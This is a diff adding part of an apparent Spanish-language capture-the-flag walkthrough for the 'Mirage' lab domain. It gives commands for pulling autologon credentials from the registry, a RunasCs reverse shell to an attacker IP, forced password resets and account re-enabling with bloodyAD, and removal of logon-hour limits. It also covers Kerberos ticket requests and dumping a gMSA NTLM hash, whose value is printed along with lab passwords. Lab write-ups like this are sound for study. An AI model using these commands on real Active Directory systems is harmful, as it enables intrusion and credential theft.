@@ -605,20 +605,128 @@ evil-winrm -i DC01.mirage.htb -k -u nathan.aadam -r MIRAGE.HTB
 <img width="1920" height="449" alt="image" src="https://github.com/user-attachments/assets/2eab34b4-ad26-443b-ab4f-dd5408eed915" />
 
 
+Despues de un rato buscando en el sistema, si revisamos el registro `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` obtenemos credenciales de un nuevo usuario
+
+>>> Registro {HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon} : almacena configuraciones relacionadas con el proceso de inicio de sesión interactivo, es un registro muy importante debido a que si el sistema esta configurado para el inicio de sesión automático, aqui en este registro se almacenan las credenciales en texto plano
 
 
 
+```powershell
+PS C:\Users\nathan.aadam\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
 
 
+<img width="1920" height="900" alt="image" src="https://github.com/user-attachments/assets/4e520c9d-91c5-4f03-8c40-1b831f595430" />
+
+como no es posible acceder via `WinRm` con este usuario haremos uso de `RunasCs.exe` para establecer una shell, primero la cargamos y luego lanzamos la shell
+
+```bash
+nc -lnvp 5555 # esperamos la revershell en nuestra maquina
+```
+```powershell
+./RunasCs.exe mark.bbond 1day@atime powershell -r 10.10.14.128:5555 # envio la shell como el nuevo usuario
+```
+
+<img width="1920" height="709" alt="image" src="https://github.com/user-attachments/assets/1a59d7cd-3a7a-4014-a1cf-d06502f64106" />
+
+obtenemos acceso como el usuario `mark.bbond`, ahora vamos a chequear en `bloodhound`
+
+<img width="1920" height="965" alt="image" src="https://github.com/user-attachments/assets/b795cc98-40b5-4c95-96bc-b2b025b18ae5" />
+
+podemos cambiar la password del usuario `javier.mmarshall` asi que ejecutamos:
+
+```powershell
+bloodyAD -k --host DC01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' set password JAVIER.MMARSHALL 'P4ssw0rd!' #cambio de password!
+```
+
+logramos cambiar la password del usuario pero igual no podemos hacer uso de ella por lo que solicitamos informacion de la cuenta
+
+```bash
+bloodyAD --kerberos -u "mark.bbond" -p '1day@atime' -d "mirage.htb" --host "dc01.mirage.htb" get object "javier.mmarshall" --attr userAccountControl
+```
+```bash
+distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
+userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
+```
+
+la cuenta aparece como Desactivada, asi que la activamos (todo como el usuario mark.bbond)
+
+```powershell
+Enable-ADAccount -Identity javier.mmarshall
+```
+
+si consultamos nuevamente informacion veremos que esta activa
+
+```powershell
+Get-ADUser -Identity javier.mmarshall
+```
+
+<img width="1920" height="321" alt="image" src="https://github.com/user-attachments/assets/80a80735-ae12-4a1c-b714-5b37c3740e7c" />
+
+Pero aun asi no es posible hacer uso de la cuenta ya que cuanto intentamos lanzar una shell con `RunasCs.exe` nos dice:
+
+>>> [-] RunasCsException: LogonUser failed with error code: Your account has time restrictions that keep you from signing in right nowP
+
+<img width="1920" height="173" alt="image" src="https://github.com/user-attachments/assets/4bc1414a-ba5a-4d48-9284-40f4777e6e8a" />
+
+Esto quiere decir que la cuenta tiene una restriccion horaria, por lo que ahora debemos quitar estar restriccion para poder autenticarnos con ella!!!
+
+### Eliminando restriccion horaria
+
+```powershell
+$user = [ADSI]"LDAP://CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb"
+```
+
+```powershell
+$logonHours = [byte[]](0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF)
+```
+
+```powershell
+$user.Put("logonHours", $logonHours)
+```
+
+```powershell
+$user.SetInfo()
+```
+
+por ultimo consultamos los cambios
+
+```powershell
+Get-ADUser -Identity javier.mmarshall -Properties LogonHours | Select-Object -ExpandProperty LogonHours
+```
+<img width="1920" height="686" alt="image" src="https://github.com/user-attachments/assets/1c4fbf5e-b389-4521-a752-5feebe8a50ff" />
+
+ahora podemos solicitar el ticket kerberos
+
+```bash
+impacket-getTGT mirage.htb/javier.mmarshall:'P4ssw0rd!'
+```
+
+```bash
+export KRB5CCNAME=javier.mmarshall.ccache
+```
+
+continuando con las instrucciones de Bloodhound, vamos a extraer el hash `NTLM` del usuario `MIRAGE-SERVICE$`. Primero nos descargamos el script python
+
+```bash
+wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/refs/heads/main/gMSADumper.py
+```
+ejecutamos el script 
+
+```bash
+python3 gMSADumper.py -d mirage.htb -k
+```
+
+<img width="1920" height="224" alt="image" src="https://github.com/user-attachments/assets/88b1cfbe-2df5-4be0-ae12-8be6878907fc" />
 
 
+obtenemos el hash `NTML` asi que podemos solicitar el ticket kerberos para esta cuenta
 
+```bash
+impacket-getTGT mirage.htb/'Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866
+```
 
-
-
-
-
-
+<img width="1920" height="169" alt="image" src="https://github.com/user-attachments/assets/504ff88c-5b0e-41d8-8e59-fe26d735bbac" />
 
 
 
